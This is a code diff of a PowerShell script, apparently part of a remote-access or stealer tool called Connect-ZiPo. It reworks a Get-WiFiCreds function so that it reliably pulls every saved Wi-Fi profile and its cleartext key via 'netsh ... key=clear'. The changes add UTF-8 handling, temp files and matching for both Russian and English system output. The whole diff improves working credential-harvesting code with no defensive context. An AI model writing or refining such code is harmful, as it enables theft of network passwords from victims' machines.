@@ -84,10 +84,14 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $output = cmd /c "netsh wlan show profiles" | Out-String
-        $profiles = $output -split "`n" | Where-Object { $_ -match "Все профили пользователей" -or $_ -match "All User Profile" }
+        $tempFile = "$env:TEMP\wifiprofiles.txt"
+        cmd /c "chcp 65001 >nul && netsh wlan show profiles" | Out-File -Encoding UTF8 $tempFile
+        $lines = Get-Content $tempFile -Encoding UTF8
 
-        if (-not $profiles) {
+        # Фильтруем строки с названиями сетей
+        $profiles = $lines | Where-Object { $_ -match "All User Profile|Все профили пользователей" }
+
+        if (-not $profiles -or $profiles.Count -eq 0) {
             return "[INFO] No Wi-Fi profiles found (adapter may be disabled or unavailable)."
         }
 
@@ -95,10 +99,14 @@ function Connect-ZiPo {
         foreach ($line in $profiles) {
             $profile = ($line -split ":")[1].Trim()
             $results += "`n[$profile]`n"
-            $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
-            $key = ($details -split "`n") | Where-Object { $_ -match "Содержимое ключа|Key Content" }
-            if ($key) {
-                $results += ($key -join "`n")
+
+            $detailFile = "$env:TEMP\wifi_detail.txt"
+            cmd /c "chcp 65001 >nul && netsh wlan show profile name=""$profile"" key=clear" | Out-File -Encoding UTF8 $detailFile
+            $detailLines = Get-Content $detailFile -Encoding UTF8
+
+            $keyLine = $detailLines | Where-Object { $_ -match "Key Content|Содержимое ключа" }
+            if ($keyLine) {
+                $results += ($keyLine -join "`n")
             } else {
                 $results += "[!] No key found"
             }
